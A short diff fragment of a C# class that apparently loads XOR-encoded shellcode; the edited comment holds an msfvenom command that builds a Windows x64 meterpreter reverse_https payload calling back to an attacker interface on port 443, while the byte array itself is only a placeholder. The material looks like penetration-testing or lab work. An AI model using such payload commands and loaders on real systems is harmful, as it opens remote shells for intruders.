@@ -43,7 +43,7 @@ public class TestClass
 
 
         // Xor-encoded payload, key 0xfa
-        // msfvenom -p windows/x64/meterpreter/reverse_https LHOST=tun0 LPORT=443 -f csharp -o --encrypt xor --encrypt-key "\xfa"
+        // msfvenom -p windows/x64/meterpreter/reverse_https LHOST=tun0 LPORT=443 -f csharp --encrypt xor --encrypt-key "\xfa"
         byte[] buf = new byte[748] { shellcodeHere };
 
         // Decode the payload
